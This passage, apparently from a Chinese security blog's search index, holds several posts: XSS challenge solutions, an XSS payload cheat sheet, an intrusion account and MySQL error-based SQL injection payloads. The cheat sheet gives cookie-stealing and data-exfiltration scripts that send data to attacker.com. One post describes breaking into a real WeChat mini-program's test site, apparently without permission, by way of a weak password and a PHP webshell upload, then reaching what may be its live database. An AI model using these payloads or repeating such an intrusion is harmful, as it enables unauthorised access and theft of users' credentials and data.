21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%28%2B%5B%5D%29%5B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%21%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%5D%5D%28%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%29%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%29%28%29%28%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%21%2B%5B%5D%5D%5D%2B%5B%2B%21%2B%5B%5D%5D%2B%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%5B%5D%2B%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%5D%29\n```\n\n![image-20250714173304760](XSS-DOM破坏/image-20250714173304760.png)\n\n\n\n后面我们在 研究一下`jsfuck` 到底为什么可以通过这种方式来编码\n\n##### 第七关\n\n![image-20250714173438672](XSS-DOM破坏/image-20250714173438672.png)\n\n源码\n\n```\nmafia = (new URL(location).searchParams.get('mafia') || '1+1')\nmafia = mafia.slice(0, 50)\nmafia = mafia.replace(/[\\`\\'\\\"\\+\\-\\!\\\\\\[\\]]/gi, '_')\nmafia = mafia.replace(/alert/g, '_')\neval(mafia)\n```\n\n分析\n\n这里限制了我们payload的长度不能超过50，且过滤了``' \" + - ! \\ [ ]` 所以这关完全限制了上一关的方法\n\n而且他还过滤了 alert 所以我们不能用alert 但是我们还有另外两个可以用\n\n`confirm()、prompt()`\n\n这里我们可以直接利用，但是还有其他的办法\n\n###### 第一种方法\n\n```js\neval(8680439..toString(30))(1337)\n```\n\n`..toString()` 可以将数字转换为字符\n\n8680439：其实就是 30进制的alert\n\n![image-20250714174146435](XSS-DOM破坏/image-20250714174146435.png)\n\n![image-20250714174200405](XSS-DOM破坏/image-20250714174200405.png)\n\n这里我们就是利用 这个函数\n\n那为什么是30进制不是 其他进制 呢？\n\n我们测试一下29进制\n\n利用`parseInt()` 来看一下 转换alert是什么\n\n![image-20250714174909597](XSS-DOM破坏/image-20250714174909597.png)\n\n这里可以看到 alert 的 t 转换回来消失了！！！ \n\n为什么呢？\n\nA B C D E F G H I J K L M N O P Q R S T \n\n这里我们知道A 是10进制可以进行转换\nT 在第30位，我们合理的进行推测，T 是不是就是30进制呢？\n\n![image-20250714175135098](XSS-DOM破坏/image-20250714175135098.png)\n\n所以我30~36都可以进行转换t\n\n那么我们这个payload `eval(8680439..toString(30))(1337)`就完全可以绕过过滤，实现`xss`\n\n![image-20250714175432982](XSS-DOM破坏/image-20250714175432982.png)\n\n###### 第二种方法\n\n```js\neval(location.hash.slice(1))\n```\n\n这里我们可以清楚的理解到 是通过 `location.hash.slice(1)` 这个函数来传值，我们可以通过#来插入我们的恶意代码，但是我们的xss代码并不会进入正则过滤中\n\npayload\n\n```\n?mafia=eval(location.hash.slice(1))#alert(1337)\n```\n\n![image-20250714175631542](XSS-DOM破坏/image-20250714175631542.png)\n\n###### 第三种方法\n\n```js\nFunction(/ALERT(1337)/.source.toLowerCase())()\n```\n\n因为js是严格区分大小写的 所以我们传入的`ALERT`  并不会被过滤，我们就要想办法将他转为小写\n\n这里我们查官方文档了解一下`Function()`的作用\n\n\n\n![image-20250714175931432](XSS-DOM破坏/image-20250714175931432.png)\n\n![image-20250714180008622](XSS-DOM破坏/image-20250714180008622.png)\n\nFunction()是构造函数\n\n在看看.source 是啥\n\n![image-20250714180718828](XSS-DOM破坏/image-20250714180718828.png)\n\n返回正则表达式的文本内容（即 `/pattern/flags` 中的 `pattern` 部分），不包含分隔符和标志。\n\n![image-20250714180844540](XSS-DOM破坏/image-20250714180844540.png)\n\n.toLowerCase()转小写\n\n\n\n这个payload我们就知道先通过Function 构造函数 然后 传入 `/ALERT(1337)/` 通过.source 获取到`ALERT(1337` 在通过 `toLowerCase()` 转成小写 ，最后`()`立即执行\n\n这个payload的好处是我们可以绕过他的关键字匹配，构造自己的函数\n\n![image-20250714181507067](XSS-DOM破坏/image-20250714181507067.png)\n\npayload\n\n```\nFunction(/ALERT(1337)/.source.toLowerCase())()\n```\n\n##### 第八关\n\n![image-20250714181615220](XSS-DOM破坏/image-20250714181615220.png)\n\n源码\n\n```\n<h2 id=\"boomer\">Ok, Boomer.</h2>\n<script>\n    boomer.innerHTML = DOMPurify.sanitize(new URL(location).searchParams.get('boomer') || \"Ok, Boomer\")\n    setTimeout(ok, 2000)\n</script>\n```\n\n分析\n\n这里他引入了`DOMPurify`防御用户输入框架，这个框架至今都在维护，而且绕过的概率很低，所以我们不考虑绕过的方法\n\n看到下面`setTimeout(ok, 2000)` 这里的`ok`并没有进行定义\n\n那么我们可以使用`dom clobbering`称之为`dom`破坏技术\n\n\n\n```\n<a id=ok href=javasCript:alert(1337)>\n```\n\n我们尝试传入这个来重新构造ok函数\n\n![image-20250715113259686](XSS-DOM破坏/image-20250715113259686.png)\n\n\n\n但是发现被框架过滤了，我们去github上看一下，找一下白名单\n\n![image-20250715113345829](XSS-DOM破坏/image-20250715113345829.png)\n\n`/^(?:(?:(?:f|ht)tps?|mailto|tel|callto|sms|cid|xmpp|matrix):|[^a-z]|[a-z+.\\-]+(?:[^a-z+.\\-:]|$))`\n\n这里测试发现 \n\n`mailto|tel|callto|sms|cid|xmpp|matrix`\n\n全部都能够触发alert\n\n\n\npayload\n\n```\n?boomer=<a id=ok href=\"tel:alert(1)\">\n```\n\n![image-20250714183323651](XSS-DOM破坏/image-20250714183323651.png)\n\n\n\n那么为什么我们会想到用A标签呢？\n\n1.我们需要传入一个我们可控得字符，且他能被`setTimeout` 执行\n\ntoString \n\n所以我们可以通过以下代码来进⾏fuzz得到可以通过`toString`⽅法将其转换成字符串类型的标签： \n\n```\nObject.getOwnPropertyNames(window)\n.filter(p => p.match(/Element$/))\n.map(p => window[p])\n.filter(p => p && p.prototype && p.prototype.toString\n!== Object.prototype.toString) \n```\n\n我们可以得到两种标签对象：`HTMLAreaElement ()`& `HTMLAnchorElement ()`，这两个 标签对象我们都可以利⽤href属性来进⾏字符串转换。\n\n![image-20250715114025687](XSS-DOM破坏/image-20250715114025687.png)\n\n`HTMLAreaElement`  是`area`但是他是一个空元素不能容纳任何内容，所以我们不考虑\n\n那么就只剩下`HTMLAnchorElement`  这个的意思是锚点的意思，\n\n也就是跳转，html中哪个标签可以跳转实现呢？\n\n答案呼之欲出了：A标签的 href属性 \n\n所以这里dom破坏就是在a标签的herf属性上传入我们的xss代码！\n\n\n\n##### 第九关\n\n![image-20250715172949724](XSS-DOM破坏/image-20250715172949724.png)\n\n源码\n\n```\n<!-- Challenge -->\n<div id=\"pwnme\"></div>\n\n<script>\n    var input = (new URL(location).searchParams.get('debug') || '').replace(/[\\!\\-\\/\\#\\&\\;\\%]/g, '_');\n    var template = document.createElement('template');\n    template.innerHTML = input;\n    pwnme.innerHTML = \"<!-- <p> DEBUG: \" + template.outerHTML + \" </p> -->\";\n</script>\n```\n\n分析\n\n这里我们可以看到，对get传参`debug`进行了过滤\n\n将 `! - / # & ; %`  进行了过滤\n\n那我们现在考虑，在哪个地方可以利用进行dom破坏呢？\n\n我们知道形如 `document.x` 这种我们都可以进行dom破坏\n\n这里我们很容易就发现 `template.outerHTML`，但是被`<!--` `-->` 包裹，而且为多行注释，那么我们如何进行绕过呢？\n\n\n\n![image-20250718194412725](XSS-DOM破坏/image-20250718194412725.png)\n\n我们先不考虑注释符，正常插入\n\n```\n<img src='1' onerror='alert(1)'>\n```\n\n![image-20250718210013062](XSS-DOM破坏/image-20250718210013062.png)\n\n发现正如我们预料的一样，我们的payload被注释掉了\n\n那我们就要思考如何来闭合 `<!--`\n\n经过查找大量资料发现，`<?`可以把p标签逃逸出来\n\n![image-20250718210214704](XSS-DOM破坏/image-20250718210214704.png)\n\n那么这是为什么呢？\n\n下断调试看看\n\n![image-20250718211205269](XSS-DOM破坏/image-20250718211205269.png)\n\n发现 我们传入的`<?` 变为了` <!--?-->` 这样他进入\n\n![image-20250718211335880](XSS-DOM破坏/image-20250718211335880.png)\n\n就把P标签逃逸出来了\n\n根据w3c\n\n规范文档，可以在以下链接找到：\n\n🔗 **HTML Standard - Parsing HTML Documents**\n🔗 https://html.spec.whatwg.org/multipage/parsing.html#parsing-html-documents\n\n![image-20250718232910418](XSS-DOM破坏/image-20250718232910418.png)\n\n当遇到`<` 号的时候 会切换到 标签开始状态   [tag open state](https://html.spec.whatwg.org/multipage/parsing.html#tag-open-state).\n\n然后\n\n![image-20250718233511852](XSS-DOM破坏/image-20250718233511852.png)\n\n又因为下一个字符是`?` 他会进入 [bogus comment state](https://html.spec.whatwg.org/multipage/parsing.html#bogus-comment-state).\n\n![image-20250718233648645](XSS-DOM破坏/image-20250718233648645.png)\n\n然后 下一个字符是 **Anything else**  将当前输入字符附加到注释标记的数据中。也就是`<!--?-->`,\n\n这里举个列子：输入是aaa<?bbb>ccc的时候，解析到第 i 个字符时，innerHTML 的结果是这样的\n\n```\na\naa\naaa\naaa<\naaa<!--?-->\naaa<!--?b-->\naaa<!--?bb-->\naaa<!--?bbb-->\naaa<!--?bbb-->\naaa<!--?bbb-->c\naaa<!--?bbb-->cc\naaa<!--?bbb-->ccc\n```\n\n直到该状态遇到了>为止，回到 data state。注意这个 Bogus comment state 解析到>的时候会直接回到 data state，也就是 HTML parser 最开始解析的状态，这个时候我们就可以插入 HTML 代码了。\n\n那么我们就可以试着传值测试\n\n```\n<?><img src='1' onerror='alert(1)'>\n```\n\n![image-20250718234143650](XSS-DOM破坏/image-20250718234143650.png)\n\n也是成功弹窗了，我们再次打断点看看具体是什么流程\n\n![image-20250718234243274](XSS-DOM破坏/image-20250718234243274.png)\n\n![image-20250718234255751](XSS-DOM破坏/image-20250718234255751.png)\n\n与我们的预想完全一致\n\n```\n<?><svg onload=alert(1)>\n<?><img src=1 onerror=alert(1)>\n```\n\n这两个都可以，但是切记不要用`<script>alert(1)</script>`\n\n原因就是`/` 被过滤了，就算没被过滤也不会被执行\n\n![image-20250718235939727](XSS-DOM破坏/image-20250718235939727.png)\n\nw3c文档清楚的进行了说明\n\n`document.write()` `script ` `innerHTML`  `outerHTML` \n\n*使用该方法插入时，元素通常会执行（通常会阻止进一步的脚本执行或 HTML 解析）。当使用 和 属性插入时，它们根本不会执行。*\n\n![image-20250719000131057](XSS-DOM破坏/image-20250719000131057.png)\n\n这里他也说明了 [官方文档](https://developer.mozilla.org/zh-CN/docs/Web/API/Element/innerHTML)\n\n\n\n##### 第十关\n\n![image-20250719000937250](XSS-DOM破坏/image-20250719000937250.png)\n\n\n\n源码\n\n```\n<number id=\"number\" style=\"display:none\"></number>\n<div class=\"alert alert-primary\" role=\"alert\" id=\"welcome\"></div>\n<button id=\"keanu\" class=\"btn btn-primary btn-sm\" data-toggle=\"popover\" data-content=\"DM @PwnFunction\"\n    data-trigger=\"hover\" onclick=\"alert(`If you solved it, DM me @PwnFunction :)`)\">Solved it?</button>\n    \n<script>\n    /* Input */\n    var number = (new URL(location).searchParams.get('number') || \"7\")[0],\n        name = DOMPurify.sanitize(new URL(location).searchParams.get('name'), { SAFE_FOR_JQUERY: true });\n    $('number#number').html(number);\n    document.getElementById('welcome').innerHTML = (`Welcome <b>${name || \"Mr. Wick\"}!</b>`);\n\n    /* Greet */\n    $('#keanu').popover('show')\n    setTimeout(_ => {\n        $('#keanu').popover('hide')\n    }, 2000)\n\n    /* Check Magic Number */\n    var magicNumber = Math.floor(Math.random() * 10);\n    var number = eval($('number#number').html());\n    if (magicNumber === number) {\n        alert(\"You're Breathtaking!\")\n    }\n</script>\n```\n\n分析\n\n","tags":["XSS","DOM破坏"],"categories":["web安全"]},{"title":"XSS-全","url":"/2025/07/14/XSS-全/","content":"\n\n\n\n\n## 基础概念\n\nXSS (Cross-Site Scripting) 是一种常见的 Web 安全漏洞，攻击者通过在网页中注入恶意脚本，使得其他用户在访问该页面时执行这些脚本。\n\n\n\n<!--more-->\n\n### XSS 的危害\n\n> 窃取用户 Cookie\n> 劫持用户会话\n> 修改网页内容\n> 钓鱼攻击\n> 传播恶意软件\n\n## XSS 类型\n\n**反射型 XSS**\n\n> 恶意脚本通过 URL 参数等方式注入\n> 服务器将恶意脚本反射回浏览器执行\n> 通常需要用户点击特定链接才能触发\n\n**存储型 XSS**\n\n> 恶意脚本被永久存储在服务器上\n> 当其他用户访问包含恶意脚本的页面时触发\n> 影响范围更大，危害更严重\n\n**DOM 型 XSS**\n\n> 完全在客户端执行\n> 不依赖服务器响应\n> 通过修改 DOM 结构触发\n\n## Payload 集合\n\n### 1. 基础 Payloads\n\n#### 1.1 基本弹窗\n\n```\n<script>alert('XSS')</script>\n<img src=x onerror=alert('XSS')>\n```\n\n#### 1.2 闭合标签\n\n```\n'><script>alert('XSS')</script>\n\"><script>alert('XSS')</script>\n```\n\n#### 1.3 事件处理器\n\n```\n<img src=x onerror=alert('XSS')>\n<div onmouseover=\"alert('XSS')\">hover me</div>\n```\n\n### 2. 高级攻击脚本\n\n#### 2.1 基础脚本标签\n\n```\n<!-> 基本弹窗 -->\n<script>alert(\"hello\")</script>   <!-> 弹出hello -->\n<script>alert(/hello/)</script>   <!-> 弹出hello -->\n<script>alert(1)</script>        <!-> 弹出1,对于数字可以不用引号 -->\n<script>alert(document.cookie)</script>      <!-> 弹出cookie -->\n<script src=http://xxx.com/xss.js></script>  <!-> 引用外部的xss -->\n```\n\n#### 2.2 数据窃取脚本\n\n```\n<!-> 使用 window.location.href -->\n<script>window.location.href=\"http://attacker.com/collect?cookie=\"+document.cookie</script>\n\n<!-> 使用 document.location.href -->\n<script>document.location.href=\"http://attacker.com/collect?cookie=\"+document.cookie</script>\n\n<!-> 使用 window.open -->\n<script>window.open=\"http://attacker.com/collect?cookie=\"+document.cookie</script>\n\n<!-> 获取特定元素内容 -->\n<script>window.location.href=\"http://attacker.com/collect?data=\"+document.getElementsByClassName('target-class')[0].innerHTML</script>\n\n<!-> 使用 jQuery 选择器 -->\n<script>$('div.layui-table-cell.laytable-cell-1-0-1').each(function(index,value){\n    if(value.innerHTML.indexOf('ctfshow{')>-1){\n        window.location.href='http://attacker.com/'+value.innerHTML;\n    }\n});</script>\n\n<!-> 使用 jQuery 选择器（带过滤） -->\n<script>$('div.layui-table-cell.laytable-cell-1-0-1').each(function (index, value) {\n    if ((value.innerHTML.indexOf('ctfshow{') > -1)&&(value.innerHTML.indexOf('script') === -1)) {\n        window.location.href = 'http://attacker.com/' +value.innerHTML;\n    }\n});</script>\n\n<!-> 使用 querySelector -->\n<script>var img = new Image();\nimg.src = \"http://attacker.com/\"+document.querySelector('#top > div.layui-container > div:nth-child(4) > div > div.layui-table-box > div.layui-table-body.layui-table-main').textContent;\ndocument.body.append(img);</script>\n```\n\n#### 2.3 特殊标签利用\n\n```\n<!-> SVG 标签 -->\n<svg onload=\"alert(1)\">\n<svg onload=\"alert(1)\"//\n<svg onload=\"location.href='http://attacker.com/collect?c='+document.cookie\"/>\n\n<!-> Body 标签 -->\n<body onload=alert(1)>\n<body onpageshow=alert(1)>\n<body onload=location.href='http://attacker.com/collect?cookie='+document.cookie></body>\n<body/**/onload=location.href='http://attacker.com/collect?cookie='+document.cookie></body>\n<body/onload=location.href='http://attacker.com/collect?cookie='+document.cookie></body>\n\n<!-> Video 标签 -->\n<video onloadstart=alert(1) src=\"/media/hack-the-planet.mp4\" />\n\n<!-> Style 标签 -->\n<style onload=alert(1)></style>\n\n<!-> Iframe 标签 -->\n<iframe onload=document.location='http://attacker.com/collect?cookie='+document.cookie>'\n```\n\n#### 2.4 特殊场景 Payloads\n\n```\n<!-> 使用 Image 对象 -->\n<script>var img = new Image();img.src = \"http://attacker.com/\"+document.cookie;</script>\n\n<!-> 使用 XMLHttpRequest -->\n<script>\nvar httpRequest = new XMLHttpRequest();\nhttpRequest.open('POST', 'http://attacker.com/api/change.php', true);\nhttpRequest.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\");\nhttpRequest.send('p=1234567');\n</script>\n\n<!-> 使用 jQuery AJAX -->\n<script>$.ajax({\n    url:\"api/amount.php\",\n    method:\"POST\",\n    data:{'u':'1','a':''}\n})</script>\n\n<!-> 使用 jQuery AJAX 修改密码 -->\n<script>$.ajax({\n    url:\"api/change.php\",\n    method:\"POST\",\n    data:{'p':'1717'}\n})</script>\n\n<!-> 使用 jQuery AJAX 修改金额 -->\n<script>$.ajax({\n    url:\"api/amount.php\",\n    method:\"POST\",\n    data:{'u':'1','a':''}\n})</script>\n```\n\n#### 2.5 监控脚本\n\n```\n// 使用 nc 监控\n<script>window.open('http://attacker.com:9033/'+document.getElementsByClassName('layui-table-cell laytable-cell-1-0-1')[1].innerHTML)</script>\n\n// 使用 jQuery 监控\n<script>$('div.layui-table-cell.laytable-cell-1-0-1').each(function(index,value){\n    if(value.innerHTML.indexOf('ctfshow{')>-1){\n        window.location.href='http://attacker.com:9033/'+value.innerHTML;\n    }\n});</script>\n\n// 使用 jQuery 监控（带过滤）\n<script>$('div.layui-table-cell.laytable-cell-1-0-1').each(function (index, value) {\n    if ((value.innerHTML.indexOf('ctfshow{') > -1)&&(value.innerHTML.indexOf('script') === -1)) {\n        window.location.href = 'http://attacker.com:9033/' +value.innerHTML;\n    }\n});</script>\n```\n\n### 3. 绕过技巧\n\n#### 3.1 标签名绕过\n\n```\n<!-> 大小写混淆 -->\n<iMg onerror=alert(1) src=a>\n\n<!-> 插入 NULL 字节 -->\n<%00img onerror=alert(1) src=a>\n\n<!-> 空格替代字符 -->\n<img%09onerror=alert(1) src=a>  <!-> Tab -->\n<img%0aonerror=alert(1) src=a>  <!-> 换行 -->\n<img/\"onerror=alert(1) src=a>   <!-> 异常语法 -->\n```\n\n#### 3.2 属性名绕过\n\n```\n<img o%00nerror=alert(1) src=a>\n<imgonerror='alert(1)'src=a>\n```\n\n#### 3.3 属性值编码绕过\n\n```\n<imgonerror=a%00lert(1) src=a>\n<imgonerror=a&#x006c;ert(1) src=a>\n```\n\n#### 3.4 可编码属性\n\n##### URL 类型属性（支持 `javascript:` 协议）\n\n> ```\n> href=`\n> `action=`\n> `formaction=`\n> `location=\n> ```\n\n##### 资源加载类属性（支持 base64 或外链）\n\n> ```\n> src=`\n> `data=`\n> `poster=`\n> `background=`\n> `code=\n> ```\n\n##### 脚本执行类属性\n\n> `on*=` 所有以 `on` 开头的事件处理属性\n\n#### 3.5 字符集与长度限制绕过\n\n##### 使用非标准编码\n\n> UTF-7\n> US-ASCII\n> UTF-16\n\n##### 拆分跨站脚本（用于绕过长度限制）\n\n\n\n```\n<script>\n  z='<script src=';\n  z+='test.c';\n  z+='n/1.js><\\/script>';\n  document.write(z);\n</script>\n```\n\n执行结果为：\n\n```\n<script src=test.cn/1.js></script>\n```\n\n\n\n##### JavaScript 层面的绕过技巧\n\n```\n<!-> Unicode 编码关键字 -->\n<script>a\\u006cert(1)</script>\n<script>eval('a\\u006cert(1)')</script>\n\n<!-> 替代点操作符 -->\n<script>alert(document['cookie'])</script>\n<script>with(document)alert(cookie)</script>\n```\n\n### 4. XSS 可插入位置\n\n```\n<!-> 用户输入作为 script 标签内容 -->\n<script>用户输入</script>\n\n<!-> 用户输入作为 HTML 注释 -->\n<!-> 用户输入 -->\n<!-> --><script>alert('hack')</script><!-> -->\n\n<!-> 用户输入作为标签属性名 -->\n<div 用户输入=\"xx\"></div>\n<div ></div><script>alert('hack')</script><div a=\"xx\"></div>\n\n<!-> 用户输入作为标签属性值 -->\n<div id=\"用户输入\"></div>\n<div id=\"\"></div><script>alert('hack')</script><div a=\"x\"></div>\n\n<!-> 用户输入作为标签名 -->\n<用户输入 id=\"xx\" />\n<><script>alert('hack')</script><b id=\"xx\" />\n\n<!-> 用户输入作为 CSS 内容 -->\n<style>用户输入</style>\n<style></style><script>alert('hack')</script><style></style>\n```\n\n### 5. 漏洞挖掘\n\n#### 5.1 黑盒测试\n\n> URL 参数\n> 表单输入\n> 搜索框\n> 评论系统\n> 个人信息页面\n\n#### 5.2 白盒测试\n\n> 检查输入处理函数\n> 检查输出编码\n> 检查 DOM 操作\n> 检查 JavaScript 事件处理\n\n#### 5.3 常见业务场景\n\n> 重灾区：评论区、留言区、个人信息、订单信息等\n> 针对型：站内信、网页即时通讯、私信、意见反馈\n> 存在风险：搜索框、当前目录、图片属性等\n\n#### 5.4 漏洞查找方法\n\n##### 基本验证[¶](https://wilesangh.github.io/ctf-web/xss_guide/#_6)\n\n```\n\"><script>alert(document.cookie)</script>\n\"><ScRiPt>alert(document.cookie)</ScRiPt>\n\"%3e%3cscript%3ealert(document.cookie)%3c/script%3e\n\"><scr<script>ipt>alert(document.cookie)</scr</script>ipt>\n%00\"><script>alert(document.cookie)</script>\n```\n\n##### DOM 型 XSS 查找\n\n检查以下危险的 DOM 属性和 API：\n\n> ```\n> document.location`\n> `document.URL`\n> `document.URLUnencoded`\n> `document.referrer`\n> `window.location\n> ```\n\n检查以下危险的 JavaScript 操作：\n\n> ```\n> document.write()` / `document.writeln()`\n> `document.body.innerHTML`\n> `eval()`\n> `window.execScript()`\n> `window.setInterval()` / `window.setTimeout()\n> ```\n\n### 6. 防御措施\n\n#### 6.1 输入验证\n\n> 长度限制\n> 字符白名单\n> 正则表达式过滤\n\n#### 6.2 输出编码\n\n> HTML 实体编码\n> JavaScript 编码\n> URL 编码\n\n#### 6.3 安全响应头\n\n> Content-Security-Policy\n> X-XSS-Protection\n> X-Content-Type-Options\n\n#### 6.4 其他措施\n\n> 使用 HttpOnly Cookie\n> 实施 CSRF 令牌\n> 使用安全的框架和库\n\n#### 6.5 DOM 型防御\n\n```\n// 输入验证\nvar a = document.URL;\na = a.substring(a.indexOf(\"message=\") + 8);\na = unescape(a);\nvar regex = /^([A-Za-z0-9\\s]+)$/;\nif (regex.test(a)) {\n    document.write(a);\n}\n\n// 输出编码\nfunction reinit(str) {\n    var d = document.createElement('div');\n    d.appendChild(document.createTextNode(str));\n    return d.innerHTML;\n}\n```\n\n### 7. 实战案例\n\n#### 7.1 反射型 XSS 利用\n\n```\n<script>document.location.href='https://attacker.com/steal?cookie='+document.cookie</script>\n```\n\n#### 7.2 存储型 XSS 利用\n\n```\n<img src=\"\" onerror=location.href=\"https://attacker.com/steal?cookie=\"+document.cookie>\n```\n\n#### 7.3 DOM 型 XSS 利用\n\n```\n<script>\n$('div.layui-table-cell').each(function(index,value){\n    if(value.innerHTML.indexOf('flag{')>-1){\n        window.location.href='http://attacker.com/'+value.innerHTML;\n    }\n});\n</script>\n```\n","tags":["XSS"],"categories":["web安全"]},{"title":"实战-关于微信小程序盲盒","url":"/2025/07/13/实战-关于微信小程序盲盒/","content":"\n进入微信，搜索盲盒小程序发现有很多的小程序\n\n<!--more-->\n\n![image-20250713124718273](实战-关于微信小程序盲盒/image-20250713124718273.png)\n\n\n\n这里我们用黄鸟抓包，找到相应的地址\n\n去fofa 收集子域名\n\n![image-20250713140502292](实战-关于微信小程序盲盒/image-20250713140502292.png)\n\n找到了一个测试站点\n\n\n\n![image-20250713140543354](实战-关于微信小程序盲盒/image-20250713140543354.png)\n\n弱密码登录，很幸运，直接登录成功\n\ntips：如果没有成功登录，可以用密码喷洒\n\n![image-20250713140639212](实战-关于微信小程序盲盒/image-20250713140639212.png)\n\n接下来就是 看看这几个板块有没有利用点\n\n![image-20250713140808417](实战-关于微信小程序盲盒/image-20250713140808417.png)\n\nak ，sk暴露，这里是测试站点，我也去试了连接，但是连接不上\n\n![image-20250713140851926](实战-关于微信小程序盲盒/image-20250713140851926.png)\n\n在盒子这里也有一个利用点\n\n可能存在文件上传\n\n我们上传图片，拦截修改后缀 发现后端没有过滤php，成功上传我们的shell\n\n连接蚁剑\n\n![image-20250713141141936](实战-关于微信小程序盲盒/image-20250713141141936.png)\n\n后面进行代码审计，发现他还有一个new的站在运行\n\n![image-20250713141220732](实战-关于微信小程序盲盒/image-20250713141220732.png)\n\n![image-20250713141251134](实战-关于微信小程序盲盒/image-20250713141251134.png)\n\n也成功找到了mysql连接文件，很可能他上线就是这个数据库，连接看一下\n\n![image-20250713141439475](实战-关于微信小程序盲盒/image-20250713141439475.png)\n\n2000多个，可能还在测试中\n\n看看unix时间戳 ![image-20250713141527709](实战-关于微信小程序盲盒/image-20250713141527709.png)\n\n这套代码可能还有其他的漏洞，还需要进行更细致的代码审计\n\n\n\n总结：\n\n信息收集很重要\n\n弱口令爆破别忘掉\n\n\n\n","tags":["实战"],"categories":["web安全"]},{"title":"sql注入-报错注入","url":"/2025/07/13/sql注入-报错注入/","content":"\n## 报错注入概念\n\n数据库在执行SQL语句时，通常会先对SQL进行检测,如果SQL语句存在问题,就会返回错误信息。通过这种机制，我们可以构造恶意的SQL，触发数据库报错，而在报错信息中就存在着我们想要的信息。但通过这种方式，首先要保证SQL结构的正确性。\n\n\n\n<!--more-->\n\n<font color=maroon>1.ST_LatFromGeoHash()（mysql>=5.7.x）</font>\n\n\n\n`and ST_LatFromGeoHash(concat(0x7e,(),0x7e))--+`\n\n\n\n<font color=maroon>2.ST_LongFromGeoHash（mysql>=5.7.x)</font>\n\n`and ST_LongFromGeoHash(concat(0x7e,(),0x7e))--+`\n\n<font color=maroon>3.GTID (MySQL >= 5.6.X - 显错<=200)</font>\n\n0x01 GTID\n\nGTID是MySQL数据库每次提交事务后生成的一个全局事务标识符，GTID不仅在本服务器上是唯一的，其在复制拓扑中也是唯一的\n\nGTID_SUBSET() 和 GTID_SUBTRACT()函数\n\n0X02 函数详解\n\nGTID_SUBSET() 和 GTID_SUBTRACT() 函数，我们知道他的输入值是 GTIDset ，当输入有误时，就会报错。\nGTID_SUBSET( set1 , set2 ) - 若在 set1 中的 GTID，也在 set2 中，返回 true，否则返回 false ( set1 是 set2 的子集)\nGTID_SUBTRACT( set1 , set2 ) - 返回在 set1 中，不在 set2 中的 GTID 集合 ( set1 与 set2 的差集)\n\n0x03 注入过程( payload )\n\nGTID_SUBSET函数\n\n\n\n`') or gtid_subset(concat(0x7e,(SELECT GROUP_CONCAT(user,':',password) from manage),0x7e),1)--+`\n\n\n\n\nGTID_SUBTRACT\n\n\n\n`') or gtid_subtract(concat(0x7e,(SELECT GROUP_CONCAT(user,':',password) from manage),0x7e),1)--+`\n\n<font 